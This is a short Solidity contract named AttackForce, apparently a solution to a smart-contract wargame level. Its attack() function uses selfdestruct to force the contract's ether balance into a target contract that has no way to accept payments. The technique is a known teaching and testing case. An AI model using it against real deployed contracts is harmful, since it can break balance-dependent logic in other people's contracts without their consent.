// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./force.sol";

contract AttackForce {
    Force public forceContract;

    constructor(address forceContractAddress){
        forceContract = Force(forceContractAddress);
    }

    function attack() public {
        selfdestruct(payable(address(forceContract)));
    }

    receive() external payable {}
}